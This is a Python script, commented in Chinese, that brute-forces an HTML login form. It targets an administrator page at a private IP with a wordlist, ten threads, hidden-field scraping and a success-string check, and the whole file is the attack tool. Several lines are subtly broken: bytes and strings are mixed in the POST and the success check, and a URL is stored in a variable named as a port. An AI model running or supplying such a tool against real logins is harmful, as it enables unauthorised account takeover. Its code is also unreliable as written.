"""
    暴力破解 HTML 表格认证
"""
import urllib.request
import urllib.parse
import http.cookiejar
import threading
import queue

from html.parser import HTMLParser

user_thread = 10
username = "admin"
word_list_file = "/tmp/cain.txt"
resume = None

target_url = "http://192.168.112.131/administrator/index.php"
target_port = "http://192.168.112.131/administrator/index.php"

username_field = "username"
password_field = "passwd"

success_check = "Administration - Control Panel"


class BruterParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name,value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value
            if tag_name is not None:
                self.tag_results[tag_name] = tag_value


class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False
        print("Finished setting up for:{}".format(username))

    def web_bruter(self):
        """

        """
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()  # 获取字典中密码

            jar = http.cookiejar.FileCookieJar("cookies")
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
            response = opener.open(target_url)
            page = response.read()
            print("Trying: {}:{} ( {} left )".format(self.username, brute, self.password_q.qsize()))

            # 解析隐藏区域
            parser = BruterParser()
            parser.feed(page.decode())

            post_tags = parser.tag_results

            #  添加用户名和密码区域
            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            login_data = urllib.parse.urlencode(post_tags)
            login_response = opener.open(target_port, login_data)
            login_result = login_response.read()

            if success_check in login_result:
                self.found = True
                print("[*] Bruteforce successful.")
                print("[*] Username: {}".format(username))
                print("[*] Password: {}".format(brute))
                print("[*] Waiting for other threads to exit...")

    def run_bruteforce(self):
        """

        """
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()


def build_word_list(the_word_list_file):
    with open(the_word_list_file, "rb") as fd:
        raw_buffer = fd.readlines()
    found_resume = False
    words = queue.Queue()
    for word in raw_buffer:
        word = word.rstrip()
        if resume is not None:
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print("Resuming word_list from:{}".format(resume))
        else:
            words.put(word)
    return words


def main():
    words = build_word_list(word_list_file)
    bruter_obj = Bruter(username, words)
    bruter_obj.run_bruteforce()